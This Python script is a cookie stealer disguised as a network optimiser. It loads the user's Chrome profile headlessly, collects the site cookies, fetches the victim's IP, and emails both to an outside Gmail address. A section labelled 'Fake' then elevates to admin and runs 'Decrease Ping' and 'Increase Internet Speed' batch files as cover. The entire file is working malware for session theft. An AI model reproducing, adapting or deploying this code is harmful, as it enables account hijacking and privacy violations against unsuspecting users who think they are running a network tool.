import os
import base64
from email.message import EmailMessage
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
import ctypes
import subprocess
import sys
import requests
import json
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

### Send cookies
# Required scope for using Gmail API
SCOPES = ['https://www.googleapis.com/auth/gmail.send']

CREDENTIALS_FILE = 'credentials.json'
TOKEN_FILE = 'token.json'

def get_credentials():
    creds = None
    if os.path.exists(TOKEN_FILE):
        creds = Credentials.from_authorized_user_file(TOKEN_FILE, SCOPES)
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(CREDENTIALS_FILE, SCOPES)
            creds = flow.run_local_server(port=0)
        with open(TOKEN_FILE, 'w') as token:
            token.write(creds.to_json())
    return creds

def send_email_via_gmail_api(subject, body, to_email, file_path):
    creds = get_credentials()
    service = build('gmail', 'v1', credentials=creds)

    # Create email content
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = 'xxx@gmail.com'
    msg['To'] = to_email
    msg.set_content(body)

    # Attach file if it exists
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            file_data = f.read()
            file_name = os.path.basename(file_path)
            msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

    # Encode email content to base64 format
    encoded_message = base64.urlsafe_b64encode(msg.as_bytes()).decode()

    # Send email via Gmail API
    try:
        message = {
            'raw': encoded_message
        }
        send_result = service.users().messages().send(userId="me", body=message).execute()
        print(f"Successfully! ID: {send_result['id']}")
    except Exception as error:
        print(f"An error occurred: {error}")

#############################

# Get the current username on Windows
username = os.getlogin()

# Create an Options object to configure the browser
chrome_options = Options()
chrome_options.add_argument(f"user-data-dir=C:/Users/{username}/AppData/Local/Google/Chrome/User Data")
chrome_options.add_argument("profile-directory=Default")  # Or another profile name if needed
chrome_options.add_argument("--headless")  # Run in headless mode
chrome_options.add_argument("--no-sandbox")  # This option may help avoid some issues
chrome_options.add_argument("--disable-dev-shm-usage")  # This option helps to resolve memory issues

# Initialize the browser with the configuration
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)

# Open the website
driver.get("https://xxx.com")

# Get cookies
cookies = driver.get_cookies()

# Convert cookies to JSON string
cookies_json = json.dumps(cookies)

#############################

# Get user's IP address
def get_ip():
    url = "https://ipinfo.io"
    try:
        response = requests.get(url)
        data = response.json()
        return data.get("ip"), "None"  # Return IP and error as "None" if no error
    except requests.RequestException as e:
        return None, f"Error getting IP address: {e}"

# Get IP address and error if any
ipv4_ipv6, Err = get_ip()

#############################

# Send email
send_email_via_gmail_api(
    subject='Cookies Data',
    body=f"Write something \n\nIP: {ipv4_ipv6}\nError: {Err}\n\n{cookies_json}", 
    to_email='your_mail@gmail.com',
    file_path=None  # No need to attach a file
)

#############################

### Fake
# Request admin rights for the Python script
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    bat_files = ["Clear DNS.bat", 
                 "Decrease Ping.bat", 
                 "Fix Network Lag, Spikes.bat",
                 "Increase Internet Speed.bat",
                 "Ping Stable.bat",
                 "Remove Bandwidth Limit.bat",
                 "Reset Network Cache.bat",
                 "Reset network Winsock.bat",
                 "Stop Network Throttling Command.bat",
                 "TCP Commands.bat",
                 "TCP Global Netsh.bat",
                 "YouTube Buffer Decrease.bat"]
    processes = []
    
    for bat_file in bat_files:
        # Run the .bat file in separate processes
        process = subprocess.Popen(bat_file, shell=True)
        processes.append(process)
    
    for process in processes:
        process.wait()
    
else:
    # Restart the script with admin rights if not already
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
